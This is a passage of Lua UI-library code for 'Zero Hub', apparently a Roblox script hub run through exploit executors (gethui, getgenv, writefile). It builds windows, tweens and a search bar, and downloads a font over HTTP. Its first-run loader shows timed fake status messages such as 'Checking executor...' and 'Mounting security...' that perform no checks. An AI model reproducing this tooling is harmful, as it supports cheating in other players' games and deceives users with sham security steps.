		for k, v17 in pairs(arg2) do
			pcall(function()
				arg[k] = v17
			end)
		end

		return
	end

	local tween = TweenService:Create(arg, TweenInfo.new(arg3 or 0.2, arg4 or Enum.EasingStyle.Quint, arg5 or Enum.EasingDirection.Out), arg2)
	tween:Play()
	return tween
end

local tbl13 = {}
local flag5 = true

local function fn16(arg)
	if arg:IsA("UIStroke") then
		table.insert(tbl13, { arg, "Transparency" })
	elseif arg:IsA("GuiObject") then
		table.insert(tbl13, { arg, "BackgroundTransparency" })

		if arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox") then
			table.insert(tbl13, { arg, "TextTransparency" })
		end

		if arg:IsA("ImageLabel") or arg:IsA("ImageButton") then
			table.insert(tbl13, { arg, "ImageTransparency" })
		end
	end
end

local function fn17(arg, arg2, arg3)
	local instance = Instance.new(arg)
	local v17 = pairs
	local tbl14 = arg2 or {}

	for k, v18 in v17(tbl14) do
		if k ~= "Parent" then
			instance[k] = v18
		end
	end

	local v18 = ipairs
	arg3 = arg3 or {}

	for _, v19 in v18(arg3) do
		v19.Parent = instance
	end

	if flag5 then
		fn16(instance)
	end

	if arg2 and arg2.Parent then
		instance.Parent = arg2.Parent
	end

	return instance
end

local ok, result = pcall(function(arg, arg2)
	local str4 = arg .. ".ttf"
	local str5 = arg .. ".font"

	if not isfile(str4) then
		writefile(str4, game:HttpGet(arg2))
	end

	writefile(str5, HttpService:JSONEncode({
		name = arg,
		faces = { { name = arg, weight = 600, style = "normal", assetId = getcustomasset(str4) } },
	}))

	return Font.new(getcustomasset(str5))
end, "InterSemiBold", "https://raw.githubusercontent.com/toeerolo-z/ethossuiterewriteA/main/InterSemibold%20(1).ttf")

local font = ok and result or Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.SemiBold)
local font2 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
local font3 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium)
tbl.Font = font

local function fn18()
	local ok2, result2 = pcall(function()
		return gethui()
	end)

	if ok2 and result2 then
		return result2
	end

	if pcall(function()
		return CoreGui.Name
	end) then
		return CoreGui
	end
	return localPlayer:WaitForChild("PlayerGui")
end

local function fn19(arg, ...)
	if type(arg) ~= "function" then
		return
	end
	local v17 = pcall
	local v18 = table.pack(...)
	v18.n = 2 + v18.n - 1
	table.move(v18, 1, v18.n, 2, v18)
	v18[1] = arg
	local v19, v20 = v17(table.unpack(v18, 1, v18.n))

	if not v19 then
		warn("[EthosLibrary] Callback error: " .. tostring(v20))
	end
end

local ok2 = pcall(function()
	Instance.new("UIShadow"):Destroy()
end)

local function fn20(parent, arg)
	if not ok2 then
		return nil
	end
	arg = arg or {}

	local ok3, result2 = pcall(function()
		local uiShadow = Instance.new("UIShadow")
		uiShadow.Color = arg.Color or Color3.fromRGB(0, 0, 0)
		uiShadow.Offset = arg.Offset or Vector2.new(0, 2)
		uiShadow.Size = arg.Size or 8
		uiShadow.Transparency = arg.Transparency or 0.6
		uiShadow.Parent = parent
		return uiShadow
	end)

	return ok3 and result2 or nil
end

local v17 = nil

local function fn21(arg)
	if not arg or arg == "" then
		return nil
	end

	if arg:match("^rbxassetid://") then
		return arg
	end
	local ok3, result2 = pcall(getcustomasset, arg)
	return ok3 and result2 or nil
end

local function fn22()
end

local fn23 = nil

fn23 = function(arg, arg2)
	if arg:IsA("UIStroke") then
		table.insert(arg2, { arg, "Transparency", arg.Transparency })
	elseif arg:IsA("GuiObject") then
		table.insert(arg2, { arg, "BackgroundTransparency", arg.BackgroundTransparency })

		if arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox") then
			table.insert(arg2, { arg, "TextTransparency", arg.TextTransparency })
		end

		if arg:IsA("ImageLabel") or arg:IsA("ImageButton") then
			table.insert(arg2, { arg, "ImageTransparency", arg.ImageTransparency })
		end
	end

	for _, child in ipairs(arg:GetChildren()) do
		fn23(child, arg2)
	end

	return arg2
end

local function fn24(arg)
	local v18 = fn23(arg, {})

	for _, v19 in ipairs(v18) do
		v19[1][v19[2]] = 1
	end

	local position = arg.Position
	arg.Position = position - UDim2.fromOffset(0, 10)
	fn15(arg, { Position = position }, 0.22, Enum.EasingStyle.Quint)

	for _, v19 in ipairs(v18) do
		fn15(v19[1], { [v19[2]] = v19[3] }, 0.22)
	end

	return v18
end

local function fn25(arg, arg2)
	fn15(arg, { Position = arg.Position - UDim2.fromOffset(0, 10) }, 0.2, Enum.EasingStyle.Quint)
	local v18 = ipairs
	local v19 = arg2 or fn23(arg, {})

	for _, v20 in v18(v19) do
		fn15(v20[1], { [v20[2]] = 1 }, 0.2)
	end

	task.delay(0.22, function()
		if arg and arg.Parent then
			arg:Destroy()
		end
	end)
end

local function fn26(arg)
	local v18 = fn23(arg, {})

	for _, v19 in ipairs(v18) do
		v19[1][v19[2]] = 1
	end

	for _, v19 in ipairs(v18) do
		fn15(v19[1], { [v19[2]] = v19[3] }, 0.3, Enum.EasingStyle.Quint)
	end
end

local flag6 = false
local ImageLabel = nil
local tbl14 = {}

local function fn27(arg)
	if arg == flag6 then
		return
	end
	flag6 = arg

	if arg then
		for _, v18 in ipairs(tbl14) do
			v18.Visible = false
		end

		if ImageLabel then
			ImageLabel.Visible = true
			fn15(ImageLabel, { ImageTransparency = 0 }, 0.2)
		end

		local window = tbl.Window

		if window and window.Main then
			fn15(window.Main, { BackgroundTransparency = settings.DragFadeTransparency }, 0.2)
		end
	else
		if ImageLabel then
			fn15(ImageLabel, { ImageTransparency = 1 }, 0.2)

			task.delay(0.16, function()
				if not flag6 and ImageLabel then
					ImageLabel.Visible = false
				end
			end)
		end

		for _, v18 in ipairs(tbl14) do
			v18.Visible = true
		end

		local window = tbl.Window

		if window and window.Main then
			fn15(window.Main, { BackgroundTransparency = 0 }, 0.2)
		end
	end
end

local function fn28(arg, arg2)
	local flag7 = false
	local position = nil
	local position2 = nil

	local function fn29(arg3)
		return arg3 == Enum.UserInputType.MouseButton1 or arg3 == Enum.UserInputType.Touch
	end

	local function fn30(arg3)
		return arg3 == Enum.UserInputType.MouseMovement or arg3 == Enum.UserInputType.Touch
	end

	arg.InputBegan:Connect(function(input)
		if fn29(input.UserInputType) then
			flag7 = true
			position = input.Position
			position2 = arg2.Position
			tbl:CloseAllPopups()
			fn27(true)
		end
	end)

	fn14(UserInputService.InputEnded, function(arg3)
		if fn29(arg3.UserInputType) and flag7 then
			flag7 = false
			fn27(false)
		end
	end)

	fn14(UserInputService.InputChanged, function(arg3)
		if flag7 and fn30(arg3.UserInputType) then
			local n3 = arg3.Position - position
			arg2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n3.X, position2.Y.Scale, position2.Y.Offset + n3.Y)
		end
	end)
end

local tbl15 = {}

local function fn29(arg, arg2, arg3, arg4)
	if arg2 then
		fn15(arg2, { Rotation = arg3 and (arg4 or 180) or 0 }, 0.25)
	end

	local parent = arg.Parent

	if not pcall(function()
		parent.ClipDescendants = parent.ClipDescendants
	end) then
		arg.Visible = not arg3
		return
	end

	if arg3 then
		local y = parent.AbsoluteSize.Y

		if y > 0 then
			tbl15[parent] = y
		end

		parent.ClipDescendants = true
		parent.AutomaticSize = Enum.AutomaticSize.None
		parent.Size = UDim2.new(1, 0, 0, y)
		arg.Visible = false
		fn15(parent, { Size = UDim2.new(1, 0, 0, 35) }, 0.22, Enum.EasingStyle.Quint)

		task.delay(0.24, function()
			parent.AutomaticSize = Enum.AutomaticSize.Y
			parent.Size = UDim2.new(1, 0, 0, 0)
		end)
	else
		local y = parent.AbsoluteSize.Y
		local n3 = tbl15[parent] or 200
		parent.ClipDescendants = true
		parent.AutomaticSize = Enum.AutomaticSize.None
		parent.Size = UDim2.new(1, 0, 0, y)
		arg.Visible = true
		fn15(parent, { Size = UDim2.new(1, 0, 0, n3) }, 0.22, Enum.EasingStyle.Quint)

		task.delay(0.24, function()
			parent.AutomaticSize = Enum.AutomaticSize.Y
			parent.Size = UDim2.new(1, 0, 0, 0)
			parent.ClipDescendants = false
		end)
	end
end

tbl.CloseAllPopups = function(arg, arg2)
	for _, popup in ipairs(tbl.Popups) do
		if popup ~= arg2 and popup.Close then
			popup.Close()
		end
	end
end

local function fn30(arg)
	local tbl16 = { Close = arg }
	table.insert(tbl.Popups, tbl16)
	return tbl16
end

local index = {}
index.__index = index
local index2 = {}
index2.__index = index2
local index3 = {}
index3.__index = index3

local function fn31(arg, arg2)
	return (fn17("Frame", {
		Name = "ElementHolder",
		Parent = arg,
		ZIndex = 2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, 0, 0, arg2 or 0),
	}))
end

local function fn32(arg, arg2, arg3)
	local TextLabel = fn17("TextLabel", {
		Name = "Title",
		Parent = arg,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = arg3 or theme.Text,
		AutomaticSize = Enum.AutomaticSize.XY,
		Text = arg2,
	})

	fn17("UIPadding", {
		PaddingTop = UDim.new(0, 7),
		PaddingLeft = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 3),
		Parent = TextLabel,
	})

	return TextLabel
end

local function fn33(arg, arg2)
	local TextLabel = fn17("TextLabel", {
		Name = "Description",
		Parent = arg,
		TextWrapped = true,
		BorderSizePixel = 0,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.SubText,
		Size = UDim2.new(1, -55, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		Text = arg2,
		Position = UDim2.new(0, 0, 0, 24),
	})

	fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), PaddingBottom = UDim.new(0, 6), Parent = TextLabel })
	return TextLabel
end

local function fn34(tab, name)
	local Frame2 = fn17("Frame", {
		Name = "Groupbox",
		Parent = tab.Page,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Panel,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, 0, 0, 0),
	})

	fn17("UIStroke", { Color = theme.Stroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Frame2 })
	fn17("UICorner", { CornerRadius = UDim.new(0, 1), Parent = Frame2 })
	fn17("UIPadding", { PaddingBottom = UDim.new(0, 5), Parent = Frame2 })
	fn20(Frame2, { Color = Color3.fromRGB(140, 140, 170), Size = 8, Transparency = 0.82, Offset = Vector2.new(0, 0) })

	local TextLabel = fn17("TextLabel", {
		Name = "GroupboxTitle",
		Parent = Frame2,
		BorderSizePixel = 0,
		TextSize = 17,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.GroupboxTitle,
		Size = UDim2.new(0, 0, 0, 30),
		AutomaticSize = Enum.AutomaticSize.X,
		Text = name,
	})

	fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = TextLabel })

	local ImageButton = fn17("ImageButton", {
		Name = "GroupboxArrow",
		Parent = Frame2,
		BorderSizePixel = 0,
		AutoButtonColor = false,
		BackgroundTransparency = 1,
		ImageColor3 = theme.CategoryTitle,
		AnchorPoint = Vector2.new(1, 0),
		Image = tbl12.Arrow,
		Size = UDim2.new(0, 15, 0, 15),
		Position = UDim2.new(1, -8, 0, 8),
	})

	local Frame3 = fn17("Frame", {
		Name = "Container",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, 0, 0, 0),
		Position = UDim2.new(0, 0, 0, 31),
	})

	fn17("UIListLayout", { Padding = UDim.new(0, 0), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame3 })
	local obj = setmetatable({}, index3)
	obj.Window = tab.Window
	obj.Tab = tab
	obj.Box = Frame2
	obj.Container = Frame3
	obj.Arrow = ImageButton
	obj.Collapsed = false
	obj.Name = name
	fn13(name, "Section", nil, obj)

	ImageButton.MouseButton1Click:Connect(function()
		obj.Collapsed = not obj.Collapsed
		fn29(Frame3, ImageButton, obj.Collapsed, 180)
	end)

	ImageButton.MouseEnter:Connect(function()
		fn15(ImageButton, { Rotation = (obj.Collapsed and 180 or 0) + 20 }, 0.2)
	end)

	ImageButton.MouseLeave:Connect(function()
		fn15(ImageButton, { Rotation = obj.Collapsed and 180 or 0 }, 0.2)
	end)

	obj.SetCollapsed = function(arg, collapsed)
		obj.Collapsed = collapsed
		fn29(Frame3, ImageButton, collapsed, 180)
	end

	table.insert(tbl11, obj)
	return obj
end

tbl.CreateWindow = function(arg, arg2)
	local tbl16 = arg2 or {}

	if getgenv()._ZeroWindow then
		pcall(function()
			getgenv()._ZeroWindow:Unload()
		end)

		getgenv()._ZeroWindow = nil
	end

	if not tbl16.GameName then
		pcall(function()
			tbl16.GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
		end)
	end

	local flag7 = false

	pcall(function()
		flag7 = isfile("ZeroHub/Zero_Loaded.txt")
	end)

	if not flag7 then
		pcall(function()
			writefile("ZeroHub/Zero_Loaded.txt", "1")
		end)

		local font4 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)

		local ScreenGui = fn17("ScreenGui", {
			Name = "ZeroLoader",
			ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
			ResetOnSpawn = false,
			IgnoreGuiInset = true,
			DisplayOrder = 99999,
			Parent = fn18(),
		})

		local Frame2 = fn17("Frame", {
			Parent = ScreenGui,
			BorderSizePixel = 0,
			BackgroundColor3 = Color3.fromRGB(0, 0, 0),
			Size = UDim2.fromScale(1, 1),
		})

		local v18 = fn17
		local tbl17 = {}
		local numberSequence = NumberSequence.new
		local tbl18 = {}
		local v19 = NumberSequenceKeypoint.new(0, 1)
		local v20 = NumberSequenceKeypoint.new(0.5, 0.7)
		local v21 = NumberSequenceKeypoint.new(0.75, 0.3)
		local new = NumberSequenceKeypoint.new
		tbl18[1] = v19
		tbl18[2] = v20
		tbl18[3] = v21

		do
			local values = table.pack(new(1, 0))
			table.move(values, 1, values.n, 4, tbl18)
		end

		tbl17.Transparency = numberSequence(tbl18)
		tbl17.Rotation = 90
		tbl17.Parent = Frame2
		v18("UIGradient", tbl17)

		local TextLabel = fn17("TextLabel", {
			Parent = ScreenGui,
			Text = "Zero Hub",
			FontFace = font4,
			TextSize = 52,
			TextColor3 = Color3.fromRGB(255, 255, 255),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			AnchorPoint = Vector2.new(0, 1),
			Position = UDim2.new(0, 24, 1, -48),
			Size = UDim2.fromOffset(500, 56),
			TextXAlignment = Enum.TextXAlignment.Left,
		})

		local TextLabel2 = fn17("TextLabel", {
			Parent = ScreenGui,
			Text = "Loading...",
			FontFace = font4,
			TextSize = 26,
			TextColor3 = Color3.fromRGB(180, 180, 190),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			AnchorPoint = Vector2.new(0, 1),
			Position = UDim2.new(0, 24, 1, -14),
			Size = UDim2.fromOffset(900, 30),
			TextXAlignment = Enum.TextXAlignment.Left,
		})

		local tbl19 = {
			{ 1, "Loading..." },
			{ 1.2, "Validating environment..." },
			{ 1, "Checking executor..." },
			{ 1.2, "Downloading assets..." },
			{ 1.2, "Caching components..." },
			{ 1, "Building interface..." },
			{ 1, "Loading configurations..." },
			{ 1, "Applying theme..." },
			{
				3.5,
				"Showcase Zero Hub for a free 1 day premium key! Make a ticket with your video link.",
			},
			{ 1, "Mounting security..." },
			{ 1, "Finalizing..." },
			{ 0.8, "Done." },
		}

		for i, v22 in ipairs(tbl19) do
			task.wait(v22[1])
			TextLabel2.Text = v22[2]

			if i == 9 then
				TextLabel2.TextColor3 = Color3.fromRGB(255, 200, 80)
			elseif i == #tbl19 then
				TextLabel2.TextColor3 = Color3.fromRGB(80, 220, 120)
			else
				TextLabel2.TextColor3 = Color3.fromRGB(180, 180, 190)
			end
		end

		task.wait(0.8)
		TweenService:Create(Frame2, TweenInfo.new(0.5, Enum.EasingStyle.Quint), { BackgroundTransparency = 1 }):Play()
		TweenService:Create(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quint), { TextTransparency = 1, Position = TextLabel.Position + UDim2.fromOffset(0, 10) }):Play()
		TweenService:Create(TextLabel2, TweenInfo.new(0.4, Enum.EasingStyle.Quint), { TextTransparency = 1, Position = TextLabel2.Position + UDim2.fromOffset(0, 10) }):Play()

		task.delay(0.55, function()
			if ScreenGui then
				ScreenGui:Destroy()
			end
		end)
	end

	local ScreenGui = fn17("ScreenGui", {
		Name = "Zero",
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		Parent = fn18(),
	})

	local v18 = fn17

	local Frame2 = v18("Frame", {
		Name = "MainFrame",
		Parent = ScreenGui,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Background,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = tbl16.Position or UDim2.fromScale(0.5, 0.5),
		Size = flag4 and UDim2.fromScale(0.92, 0.8) or tbl16.Size or UDim2.fromOffset(960, 580),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame2 })

	fn17("UIStroke", {
		Transparency = 0.5,
		Thickness = 1.5,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Color = theme.Stroke,
		Parent = Frame2,
	})

	fn20(Frame2, { Color = Color3.fromRGB(180, 180, 200), Size = 20, Transparency = 0.7, Offset = Vector2.new(0, 0) })

	if settings.DragImage then
		flag5 = false
		local dragImage = settings.DragImage

		if type(dragImage) == "string" and dragImage:match("^https?://") then
			pcall(function()
				if not isfile("ZeroHub/drag_image_v2.png") then
					writefile("ZeroHub/drag_image_v2.png", game:HttpGet(dragImage))
				end
			end)

			dragImage = "ZeroHub/drag_image_v2.png"
		end

		local v19 = fn21(dragImage)

		if v19 then
			local v20 = fn17

			ImageLabel = v20("ImageLabel", {
				Name = "DragImage",
				Parent = Frame2,
				BorderSizePixel = 0,
				BackgroundTransparency = 1,
				ImageTransparency = 1,
				Image = v19,
				ScaleType = Enum.ScaleType.Fit,
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.fromScale(0.5, 0.5),
				Size = settings.DragImageSize,
				Rotation = settings.DragImageRotation or 0,
				Visible = false,
				ZIndex = 50,
			})
		end

		flag5 = true
	end

	local Frame3 = fn17("Frame", {
		Name = "TopBar",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Panel,
		Size = UDim2.new(1, 0, 0, 45),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame3 })

	fn17("Frame", {
		Name = "Line",
		Parent = Frame3,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Stroke,
		Size = UDim2.new(1, 0, 0, 1),
		Position = UDim2.new(0, 0, 1, 0),
	})

	local Frame4 = fn17("Frame", { Parent = Frame3, BorderSizePixel = 0, BackgroundTransparency = 1, Size = UDim2.new(0, 470, 1, 0) })

	fn17("UIListLayout", {
		Padding = UDim.new(0, 7),
		SortOrder = Enum.SortOrder.LayoutOrder,
		VerticalAlignment = Enum.VerticalAlignment.Center,
		FillDirection = Enum.FillDirection.Horizontal,
		Parent = Frame4,
	})

	local TextLabel = fn17("TextLabel", {
		Name = "Title",
		Parent = Frame4,
		LayoutOrder = 1,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		TextSize = 17,
		TextXAlignment = Enum.TextXAlignment.Left,
		FontFace = font,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Size = UDim2.new(0, 0, 1, 0),
		AutomaticSize = Enum.AutomaticSize.X,
		Text = tbl16.Title or "ZERO",
	})

	fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = TextLabel })

	fn17("TextButton", {
		Name = "TitleClick",
		Parent = TextLabel,
		Text = "",
		BackgroundTransparency = 1,
		Size = UDim2.fromScale(1, 1),
		ZIndex = 5,
	}).MouseButton1Click:Connect(function()
		if tbl.Window and tbl.Window.ToggleVisible then
			tbl.Window:ToggleVisible()
		end
	end)

	local function fn35()
		local accent = theme.Accent
		if accent.R * 0.299 + accent.G * 0.587 + accent.B * 0.114 < 0.12 then
			return Color3.fromRGB(255, 255, 255)
		end
		return accent
	end

	if tbl16.GameName then
		local TextLabel2 = fn17("TextLabel", {
			Name = "GameName",
			Parent = Frame4,
			LayoutOrder = 2,
			BorderSizePixel = 0,
			TextSize = 12,
			BackgroundColor3 = fn35(),
			FontFace = font,
			TextColor3 = Color3.fromRGB(0, 0, 0),
			Size = UDim2.new(0, 0, 0, 20),
			AutomaticSize = Enum.AutomaticSize.X,
			Text = tbl16.GameName:upper(),
		})

		fn17("UICorner", { CornerRadius = UDim.new(0, 4), Parent = TextLabel2 })
		fn17("UIPadding", { PaddingRight = UDim.new(0, 10), PaddingLeft = UDim.new(0, 10), Parent = TextLabel2 })
		local color = Color3.fromRGB

		fn17("UIGradient", {
			Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), color(220, 220, 230)),
			Transparency = NumberSequence.new(0, 0.15),
			Rotation = 0,
			Parent = TextLabel2,
		})

		local TextButton = fn17("TextButton", {
			Parent = TextLabel2,
			Text = "",
			BackgroundTransparency = 1,
			Size = UDim2.fromScale(1, 1),
			ZIndex = 3,
		})

		TextButton.MouseEnter:Connect(function()
			fn15(TextLabel2, { BackgroundColor3 = fn35():Lerp(Color3.new(1, 1, 1), 0.2) }, 0.25)
		end)

		TextButton.MouseLeave:Connect(function()
			fn15(TextLabel2, { BackgroundColor3 = fn35() }, 0.35)
		end)

		fn12(function()
			TextLabel2.BackgroundColor3 = fn35()
		end)
	end

	local function fn36(arg3, arg4)
		local TextLabel2 = fn17("TextLabel", {
			Parent = Frame4,
			LayoutOrder = arg4,
			BorderSizePixel = 0,
			TextSize = 11,
			BackgroundColor3 = fn35(),
			FontFace = font,
			TextColor3 = Color3.fromRGB(0, 0, 0),
			Size = UDim2.new(0, 0, 0, 18),
			AutomaticSize = Enum.AutomaticSize.X,
			Text = arg3,
		})

		fn17("UICorner", { CornerRadius = UDim.new(0, 4), Parent = TextLabel2 })
		fn17("UIPadding", { PaddingRight = UDim.new(0, 8), PaddingLeft = UDim.new(0, 8), Parent = TextLabel2 })
		local color = Color3.fromRGB

		fn17("UIGradient", {
			Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), color(220, 220, 230)),
			Transparency = NumberSequence.new(0, 0.15),
			Rotation = 0,
			Parent = TextLabel2,
		})

		local TextButton = fn17("TextButton", { Parent = TextLabel2, Text = "", BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), ZIndex = 3 })

		TextButton.MouseEnter:Connect(function()
			fn15(TextLabel2, { BackgroundColor3 = fn35():Lerp(Color3.new(1, 1, 1), 0.2) }, 0.25)
		end)

		TextButton.MouseLeave:Connect(function()
			fn15(TextLabel2, { BackgroundColor3 = fn35() }, 0.35)
		end)

		fn12(function()
			TextLabel2.BackgroundColor3 = fn35()
		end)

		return TextLabel2
	end

	fn36(string.upper(tbl16.Version or "v0.0.0"), 3)
	local v19 = fn36("0 EXECUTIONS", 4)

	local function fn37(arg3, arg4, arg5)
		return fn17("ImageButton", {
			Parent = Frame3,
			BorderSizePixel = 0,
			AutoButtonColor = false,
			BackgroundTransparency = 1,
			ImageColor3 = theme.DimText,
			AnchorPoint = Vector2.new(1, 0.5),
			Image = arg3,
			Size = UDim2.new(0, arg4, 0, 25),
			Position = UDim2.new(1, arg5, 0.5, 0),
		})
	end

	local v20 = fn37(tbl12.Close, 25, -10)
	local v21 = fn37(tbl12.Minimize, 18, -45)

	local Frame5 = fn17("Frame", {
		Name = "SearchBar",
		Parent = Frame3,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.ElementBackground,
		AnchorPoint = Vector2.new(1, 0.5),
		Size = UDim2.new(0, 180, 0, 26),
		Position = UDim2.new(1, -78, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 5), Parent = Frame5 })

	local UIStroke = fn17("UIStroke", {
		Color = theme.Stroke,
		Transparency = 0.3,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame5,
	})

	local TextBox = fn17("TextBox", {
		Parent = Frame5,
		BorderSizePixel = 0,
		TextSize = 12,
		TextColor3 = theme.TextboxText,
		PlaceholderColor3 = theme.DimText,
		BackgroundTransparency = 1,
		FontFace = font,
		TextXAlignment = Enum.TextXAlignment.Left,
		Size = UDim2.new(1, -50, 1, 0),
		Position = UDim2.new(0, 8, 0, 0),
		Text = "",
		PlaceholderText = "Search...",
		ClearTextOnFocus = false,
		ZIndex = 3,
	})

	local TextLabel2 = fn17("TextLabel", {
		Parent = Frame5,
		BorderSizePixel = 0,
		TextSize = 10,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.DimText,
		AnchorPoint = Vector2.new(1, 0.5),
		Size = UDim2.new(0, 45, 1, 0),
		Position = UDim2.new(1, -4, 0.5, 0),
		Text = "",
		TextXAlignment = Enum.TextXAlignment.Right,
	})

	local Frame6 = fn17("Frame", {
		Name = "SearchResults",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Panel,
		AnchorPoint = Vector2.new(1, 0),
		Size = UDim2.new(0, 260, 0, 200),
		Position = UDim2.new(1, -78, 0, 46),
		Visible = false,
		ZIndex = 90,
		ClipsDescendants = true,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame6 })

	fn17("UIStroke", {
		Color = theme.Stroke,
		Transparency = 0.3,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame6,
	})

	local ScrollingFrame = fn17("ScrollingFrame", {
		Parent = Frame6,
		Active = true,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, 0),
		CanvasSize = UDim2.new(0, 0, 0, 0),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		ScrollBarThickness = 3,
		ScrollBarImageColor3 = theme.Stroke,
		ZIndex = 90,
	})

	fn17("UIListLayout", { Padding = UDim.new(0, 0), SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame })
	fn17("UIPadding", { PaddingTop = UDim.new(0, 4), PaddingBottom = UDim.new(0, 4), Parent = ScrollingFrame })

	local function fn38()
		for _, child in ipairs(ScrollingFrame:GetChildren()) do
			if child:IsA("Frame") or child:IsA("TextButton") then
				child:Destroy()
			end
		end
	end

	local function fn39(arg3, arg4)
		local TextButton = fn17("TextButton", {
			Parent = ScrollingFrame,
			LayoutOrder = arg4,
			BorderSizePixel = 0,
			BackgroundColor3 = theme.Panel,
			Size = UDim2.new(1, 0, 0, 36),
			Text = "",
			AutoButtonColor = false,
			ZIndex = 91,
		})

		fn17("TextLabel", {
			Parent = TextButton,
			BorderSizePixel = 0,
			TextSize = 13,
			TextXAlignment = Enum.TextXAlignment.Left,
			BackgroundTransparency = 1,
			FontFace = font,
			TextColor3 = theme.Title,
			Size = UDim2.new(0.55, -10, 0, 16),
			Position = UDim2.new(0, 10, 0, 3),
			Text = arg3.Name,
			TextTruncate = Enum.TextTruncate.AtEnd,
			ZIndex = 91,
		})

		fn17("TextLabel", {
			Parent = TextButton,
			BorderSizePixel = 0,
			TextSize = 11,
			TextXAlignment = Enum.TextXAlignment.Left,
			BackgroundTransparency = 1,
			FontFace = font,
			TextColor3 = theme.DimText,
			Size = UDim2.new(0.55, -10, 0, 14),
			Position = UDim2.new(0, 10, 0, 19),
			Text = arg3.Path,
			TextTruncate = Enum.TextTruncate.AtEnd,
			ZIndex = 91,
		})

		local TextLabel3 = fn17("TextLabel", {
			Parent = TextButton,
			BorderSizePixel = 0,
			TextSize = 10,
			BackgroundColor3 = theme.ElementBackground,
			BackgroundTransparency = 0.3,
			FontFace = font,
			TextColor3 = theme.Text,
			AnchorPoint = Vector2.new(1, 0.5),
			AutomaticSize = Enum.AutomaticSize.X,
			Size = UDim2.new(0, 0, 0, 16),
			Position = UDim2.new(1, -10, 0.5, 0),
			Text = arg3.Type,
			ZIndex = 91,
		})

		fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = TextLabel3 })
		fn17("UIPadding", { PaddingRight = UDim.new(0, 6), PaddingLeft = UDim.new(0, 6), Parent = TextLabel3 })

		fn17("Frame", {
			Parent = TextButton,
			BorderSizePixel = 0,
			BackgroundColor3 = theme.Stroke,
			BackgroundTransparency = 0.5,
			AnchorPoint = Vector2.new(0.5, 1),
			Size = UDim2.new(1, -16, 0, 1),
			Position = UDim2.new(0.5, 0, 1, 0),
			ZIndex = 91,
		})

		TextButton.MouseEnter:Connect(function()
			fn15(TextButton, { BackgroundColor3 = theme.ElementBackground }, 0.1)
		end)

		TextButton.MouseLeave:Connect(function()
			fn15(TextButton, { BackgroundColor3 = theme.Panel }, 0.1)
		end)

		TextButton.MouseButton1Click:Connect(function()
			if arg3.Tab and arg3.Tab.Select then
				arg3.Tab:Select()
			end

			TextBox.Text = ""
		end)
	end

	local function fn40(arg3)
		fn38()

		if arg3 == "" then
			Frame6.Visible = false
			TextLabel2.Text = ""
			fn15(UIStroke, { Color = theme.Stroke }, 0.15)
			return
		end

		fn15(UIStroke, { Color = theme.AccentText }, 0.15)
		local v22 = string.lower(arg3)
		local n3 = 0

		for _, v23 in ipairs(tbl.SearchIndex) do
			local v24 = string.lower(v23.Name)
			local v25 = string.lower(v23.Path)
			local v26 = string.lower(v23.Category)
			local v27 = string.lower(v23.Type)
			local v28 = string.lower(v23.GroupboxName)

